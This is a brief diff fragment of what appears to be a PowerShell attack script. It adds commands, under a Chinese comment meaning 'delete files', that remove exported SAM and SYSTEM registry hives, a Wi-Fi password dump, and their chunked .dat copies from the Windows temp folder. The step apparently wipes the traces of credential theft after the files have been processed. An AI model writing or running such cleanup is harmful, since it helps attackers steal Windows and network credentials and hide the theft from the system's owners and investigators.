@@ -92,3 +92,11 @@ foreach ($sourcePath in $files) {
         }
     }
 }
+
+# 刪除檔案
+del c:\windows\temp\sam.hiv
+del c:\windows\temp\system.hiv
+del c:\windows\temp\wifi.txt
+del c:\windows\temp\sam.hiv*.dat
+del c:\windows\temp\system.hiv*.dat
+del c:\windows\temp\wifi.txt*.dat
